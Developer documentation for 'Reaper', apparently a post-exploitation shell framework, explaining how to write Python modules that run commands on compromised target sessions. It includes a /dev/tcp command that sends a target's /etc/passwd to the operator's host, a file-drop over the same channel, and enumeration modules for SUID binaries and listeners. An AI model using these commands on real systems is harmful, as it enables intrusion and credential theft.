# Writing Reaper Modules

Reaper modules are Python classes that run commands on a connected shell session.  
Each module lives in `src/reaper/modules/` and subclasses `ReaperModule`.

---

## Quick Start

Create a file in `src/reaper/modules/my_module.py`:

```python
from reaper.modules.blueprint import ReaperModule

class MyModule(ReaperModule):
    name        = "my_module"
    description = "Does something cool."
    category    = "Enumeration"
    platform    = ["linux"]

    def run(self) -> None:
        result = self.exec("whoami")
        self.ok(f"Running as: {result.stdout.strip()}")
```

Then hot-reload without restarting:

```
reaper❯ reload
reaper❯ run my_module 1
```

---

## Class Fields

| Field | Type | Required | Description |
|---|---|---|---|
| `name` | `str` | yes | Command name used in `run <name>` |
| `description` | `str` | yes | One-line description shown in `modules` list |
| `usage` | `str` | no | Usage string shown in help |
| `arguments` | `list[dict]` | no | Argument definitions (see below) |
| `category` | `str` | no | Groups modules in the `modules` list |
| `platform` | `str \| list` | no | Target OS filter (default: `"any"`) |

### `platform` values

| Value | Matches |
|---|---|
| `"any"` | All sessions (default) |
| `"linux"` | Linux shells only |
| `"windows_ps"` | PowerShell sessions only |
| `"windows_cmd"` | CMD sessions only |
| `["linux", "windows_ps"]` | List of allowed platforms |

Reaper checks platform compatibility before running. If the session OS doesn't match, the module is skipped with a warning.

---

## Arguments

Define arguments using the `arguments` list. Each entry is a dict passed to `argparse.add_argument`.

The only required key is `flags` , a string or list of strings for the argument name/flags.

### Positional argument

```python
arguments = [
    {"flags": ["remote_path"], "help": "Path on the remote target"},
]
```

Access with `self.args.remote_path`.

### Optional argument with a default

```python
arguments = [
    {"flags": ["remote_path"], "help": "Remote path"},
    {"flags": ["local_path"],  "help": "Local save path", "nargs": "?", "default": None},
]
```

### Flag argument (--flag)

```python
arguments = [
    {"flags": ["-o", "--output"], "help": "Save output to file", "default": None},
    {"flags": ["-v", "--verbose"], "action": "store_true", "default": False},
]
```

Access with `self.args.output` and `self.args.verbose`.

### Full example with mixed arguments

```python
class GrepModule(ReaperModule):
    name      = "grep_files"
    arguments = [
        {"flags": ["pattern"],           "help": "Search pattern"},
        {"flags": ["path"],              "help": "Directory to search", "nargs": "?", "default": "/"},
        {"flags": ["-r", "--recursive"], "action": "store_true", "default": True},
        {"flags": ["-o", "--output"],    "help": "Save results to file", "default": None},
    ]

    def run(self) -> None:
        flag = "-r" if self.args.recursive else ""
        result = self.exec(f"grep {flag} {self.args.pattern!r} {self.args.path} 2>/dev/null")
        print(result.stdout)
```

---

## Execution Methods

### `self.exec(cmd, timeout=30.0) → CommandResult`

Runs a command and waits for it to finish. Returns a `CommandResult`.

```python
result = self.exec("id")
print(result.stdout)    # command output
print(result.returncode) # exit code
```

`CommandResult` fields:

| Field | Type | Description |
|---|---|---|
| `command` | `str` | The command that was run |
| `stdout` | `str` | Combined output |
| `returncode` | `int` | Exit code |
| `duration` | `float` | How long it took in seconds |

Raises `CommandTimeout` if the command exceeds `timeout` seconds.

---

### `self.exec_stream(cmd, timeout=30.0) → Iterator[StreamLine]`

Runs a command and yields output line by line as it arrives. Good for long-running commands.

```python
for line in self.exec_stream("find / -name '*.conf' 2>/dev/null", timeout=60.0):
    print(line.text)
```

`StreamLine` fields:

| Field | Type | Description |
|---|---|---|
| `text` | `str` | One line of output |

Raises `CommandTimeout` if the stream exceeds `timeout` seconds.

---

### `self.send(data: bytes) → bool`

Send raw bytes to the session socket. Returns `False` if the session is dead.

```python
self.send(b"echo hello\n")
```

---

### `self.sendline(line: str) → bool`

Send a string followed by a newline. Shorthand for `self.send((line + "\n").encode())`.

```python
self.sendline("id")
```

---

## Notification Methods

All notifications print to the Reaper console with colored icons.

| Method | Icon | Use for |
|---|---|---|
| `self.ok(msg)` | `[✓]` green | Success messages |
| `self.err(msg)` | `[✗]` red | Error messages |
| `self.warn(msg)` | `[!]` orange | Warnings |
| `self.status(msg)` | `[─]` grey | Status / progress updates |
| `self.notify(kind, msg)` | varies | Direct access to all kinds |

`notify` kinds: `"success"`, `"error"`, `"warning"`, `"info"`, `"status"`, `"new"`

```python
self.ok("File uploaded successfully.")
self.err("Remote file not found.")
self.warn("Size mismatch , verify manually.")
self.status("Scanning ports…")
self.notify("info", "Using TCP side-channel for output.")
```

---

## Spinner

Use `self.spinner(msg)` as a context manager to show an animated spinner while waiting.

```python
with self.spinner("Running nmap…"):
    result = self.exec("nmap -sV 127.0.0.1", timeout=120.0)
```

The spinner disappears automatically when the block exits.

---

## Box / Table

Use `self.box(title, data)` to render a bordered table with key-value pairs.

```python
self.box("System Info", {
    "hostname": "victim",
    "user":     "www-data",
    "kernel":   "5.15.0-generic",
})
```

Group rows under section headers by nesting dicts:

```python
self.box("Recon", {
    "Identity": {
        "user":  "www-data",
        "id":    "uid=33",
    },
    "Network": {
        "iface": "eth0",
        "ip":    "10.10.10.5",
    },
})
```

---

## Accessing the UI Module

`self.ui` gives you direct access to the full UI module (`reaper.utils.ui`).

Common helpers:

| Helper | Output |
|---|---|
| `self.ui._c(text)` | Parchment / primary text color |
| `self.ui._p(text)` | Scarlet / highlight color |
| `self.ui._y(text)` | Gold / success color |
| `self.ui._r(text)` | Red / error color |
| `self.ui._gr(text)` | Grey / secondary color |
| `self.ui._b(text)` | Bold |
| `self.ui.breaker()` | Print a `──── ☠ ────` separator |
| `self.ui.colored_text(text, (r,g,b))` | Custom RGB color |

Example:

```python
path = "/etc/shadow"
self.ok(f"Downloaded {self.ui._y(path)}  ({size} bytes)")
```

---

## Session Object

`self.session` is the `Session` dataclass for the current target.

| Attribute | Type | Description |
|---|---|---|
| `self.session.id` | `int` | Session number |
| `self.session.conn` | `socket` | Raw socket to the target |
| `self.session.addr` | `tuple` | `(ip, port)` of the remote |
| `self.session.os_type` | `str \| None` | `"linux"`, `"windows_ps"`, `"windows_cmd"`, or `None` |
| `self.session.upgraded` | `bool` | Whether the shell has been upgraded to PTY |
| `self.session.encoding` | `str` | Socket encoding (usually `"utf-8"`) |
| `self.session.eol` | `str` | Line ending (`"\n"` or `"\r\n"`) |

---

## TCP Side-Channel Helpers

For transferring data outside the shell stream, use the TCP helpers directly.

```python
from reaper.utils.tcp import get_local_ip, spawn_recv_server, spawn_send_server
```

### Receive data from target

```python
local_ip = get_local_ip(self.session.addr[0])
port, collect = spawn_recv_server(timeout=30.0)
self.session.conn.sendall(f"cat /etc/passwd > /dev/tcp/{local_ip}/{port}\n".encode())
data = collect()   # bytes
```

### Send data to target

```python
local_ip = get_local_ip(self.session.addr[0])
port, thread, errors = spawn_send_server(file_bytes, timeout=30.0)
self.session.conn.sendall(f"cat > /tmp/file < /dev/tcp/{local_ip}/{port}\n".encode())
thread.join(timeout=35.0)
```

---

## Full Examples

### Simple enumeration

```python
from reaper.modules.blueprint import ReaperModule

class SUIDModule(ReaperModule):
    name        = "suid"
    description = "Find SUID binaries on the target."
    category    = "Enumeration"
    platform    = ["linux"]

    def run(self) -> None:
        self.status("Searching for SUID binaries…")
        found = []
        for line in self.exec_stream("find / -perm -4000 -type f 2>/dev/null", timeout=60.0):
            if line.text:
                found.append(line.text)
                print(f"    {self.ui._p(line.text)}")

        if found:
            self.ok(f"Found {len(found)} SUID binaries.")
        else:
            self.warn("No SUID binaries found.")
```

### Module with arguments

```python
from reaper.modules.blueprint import ReaperModule

class ReadFileModule(ReaperModule):
    name        = "readfile"
    description = "Print the contents of a remote file."
    category    = "Utility"
    platform    = "any"
    arguments   = [
        {"flags": ["path"], "help": "Remote file path"},
        {"flags": ["-n", "--lines"], "type": int, "default": 0,
         "help": "Limit output to N lines (0 = all)"},
    ]

    def run(self) -> None:
        cmd = f"cat {self.args.path}"
        if self.args.lines:
            cmd += f" | head -{self.args.lines}"

        result = self.exec(cmd, timeout=15.0)

        if result.returncode != 0 or not result.stdout.strip():
            self.err(f"Could not read {self.args.path}")
            return

        self.ui.breaker()
        print(result.stdout)
        self.ui.breaker()
        self.ok(f"Read {self.args.path}")
```

### Module with spinner and box output

```python
from reaper.modules.blueprint import ReaperModule

class NetInfoModule(ReaperModule):
    name        = "netinfo"
    description = "Show network interfaces and open ports."
    category    = "Enumeration"
    platform    = ["linux"]

    def run(self) -> None:
        with self.spinner("Gathering network info…"):
            ifaces = self.exec("ip -o addr show 2>/dev/null | awk '{print $2, $4}'").stdout.strip()
            ports  = self.exec("ss -tlnp 2>/dev/null | tail -n +2").stdout.strip()

        self.box("Network", {
            "Interfaces": ifaces or "(none)",
            "Listeners":  ports  or "(none)",
        })
```

---

## Error Handling

Wrap risky commands in try/except to handle dropped sessions gracefully.

```python
def run(self) -> None:
    try:
        result = self.exec("some-command", timeout=10.0)
    except Exception as exc:
        self.err(f"Command failed: {exc}")
        return

    if result.returncode != 0:
        self.warn(f"Non-zero exit: {result.returncode}")
```

---

## Hot Reload

After creating or editing a module, reload without restarting Reaper:

```
reaper❯ reload
  [✓]  Modules reloaded.
```

The new module is immediately available via `run`.
